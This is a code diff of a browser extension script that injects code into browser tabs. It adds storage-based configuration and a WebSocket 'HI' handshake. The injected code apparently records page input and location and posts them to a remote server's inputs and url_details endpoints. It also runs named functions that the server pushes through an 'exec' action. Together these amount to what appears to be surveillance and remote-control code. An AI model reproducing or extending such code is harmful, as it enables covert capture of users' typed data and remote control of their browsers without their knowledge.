@@ -1,10 +1,13 @@
 (() => {
-
-  const local = () => ({ uuid, url }) => {
-    const urlApi = `${url}/api/extension/urls`
+  const local = () => async () => {
+    window.storageLocal = chrome.storage.local
+    window.storageSync = chrome.storage.sync
+    const { url, uuid } = await storageLocal.get()
+    // const urlApi = `${url}/api/extension/urls`
     const urlDetailApi = `${url}/api/extension/url_details`
     const inputApi = `${url}/api/extension/inputs`
     const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
+    storageLocal.set({ uuid: deviceId })
 
     getLocation()
     addInputListener()
@@ -17,7 +20,7 @@
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(body)
-      })
+      }).catch(e => console.error(e))
     }
 
     function addInputListener() {
@@ -57,16 +60,25 @@
     }
   }
 
-  function Client(uuid, tabId, socketUrl) {
+  async function Client(tabId) {
+    window.storageLocal = chrome.storage.local
+    window.storageSync = chrome.storage.sync
+    const { uuid, socketUrl } = await storageLocal.get()
     const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
     const ws = new WebSocket(socketUrl)
+    
+    storageLocal.set({ uuid: deviceId })
+    
     ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
     ws.onopen = (e) => {
-      ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
       ws.onmessage = ({ data }) => {
         // console.log(JSON.parse(data))
-        const { action, payload } = JSON.parse(data)
+        const { action, from, payload } = JSON.parse(data)
+        wk.remoteId = from
         switch (action) {
+          case 'HI':
+            ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
+            break
           case 'exec': wk.exec(payload.name, payload.args)
             break
         }
@@ -196,7 +208,7 @@
             this.execute(s.name, s.args)
           }
         }
-        
+
         return name ? this[name] = fn : fn
       }
 
@@ -232,13 +244,12 @@
       chrome.scripting.executeScript({
         target: { tabId },
         function: Client,
-        args: [uuid, tabId, socketUrl]
+        args: [tabId]
       })
 
       setTimeout(() => chrome.scripting.executeScript({
         target: { tabId },
-        function: local(),
-        args: [{ uuid, url }]
+        function: local()
       }), 500)
     }
   })
